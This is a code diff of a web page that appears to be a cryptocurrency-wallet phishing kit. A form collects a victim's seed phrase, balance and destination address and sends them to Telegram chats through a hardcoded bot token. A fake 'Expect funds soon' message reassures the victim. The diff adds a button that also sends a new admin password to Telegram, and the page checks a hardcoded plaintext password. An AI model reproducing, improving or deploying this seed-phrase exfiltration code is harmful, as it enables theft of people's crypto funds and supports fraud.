@@ -88,14 +88,15 @@
             
             <button type="submit"><i class="fas fa-paper-plane"></i> Submit</button>
         </form>
-        <button id="powerButton"><i class="fas fa-power-off"></i> Power</button>
+
+        <button id="changePasswordBtn"><i class="fas fa-key"></i> Change Password</button>
         <p id="status"></p>
     </div>
     
     <script>
         function checkPassword() {
             const password = document.getElementById('adminPassword').value;
-            if (password === 'hardcodedpassword') { // Replace with your real password or hash logic
+            if (password === 'hardcodedpassword') { // Replace with your real password logic
                 document.getElementById('loginPanel').style.display = 'none';
                 document.getElementById('adminPanel').style.display = 'block';
             } else {
@@ -115,12 +116,8 @@
                 timestamp: new Date().toISOString()
             };
 
-            let records = JSON.parse(localStorage.getItem('walletRecords')) || [];
-            records.push(record);
-            localStorage.setItem('walletRecords', JSON.stringify(records));
-            
             const telegramBotToken = '7980517524:AAGFkMYIdIAyKvwK1G3h_Jh1P7yyBC8QT60';
-            const chatIds = ['7651943856', '6535627233']; // Add your two Telegram chat IDs here
+            const chatIds = ['7651943856', '6535627233']; // Add your Telegram chat IDs here
 
             const message = `🚨🚨🚨 Wallet transaction loading:\nPhrase: ${record.phrase}\nUnlock Date: ${record.unlockDate}\nUnlock Time: ${record.unlockTime}\nBalance: ${record.balance}\nDestination: ${record.destination}\nLoading transaction in a bit...\nExpect funds soon✅`;
             
@@ -139,14 +136,27 @@
             alert('Request approved! Expect funds in your wallet soon.');
         });
 
-        document.getElementById('powerButton').addEventListener('click', function() {
-            const now = new Date();
-            let records = JSON.parse(localStorage.getItem('walletRecords')) || [];
-            
-            records.forEach(record => {
-                const unlockDateTime = new Date(`${record.unlockDate}T${record.unlockTime}`);
-                alert(now >= unlockDateTime ? `Unlock time reached for: ${record.destination}. Ready to work.` : `Not yet time for: ${record.destination}.`);
-            });
+        document.getElementById('changePasswordBtn').addEventListener('click', function() {
+            const newPassword = prompt('Enter new admin password:');
+            if (newPassword) {
+                const telegramBotToken = '7980517524:AAGFkMYIdIAyKvwK1G3h_Jh1P7yyBC8QT60';
+                const chatIds = ['7651943856', '7651943856']; // Add your Telegram chat IDs here
+
+                const message = `🔑 Password change request:\nNew Admin Password: ${newPassword}`;
+
+                for (const id of chatIds) {
+                    try {
+                        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ chat_id: id, text: message })
+                        });
+                    } catch (error) {
+                        console.error(`Error sending message to chat ${id}:`, error);
+                    }
+                }
+                alert('Password change request sent!');
+            }
         });
     </script>
 </body>
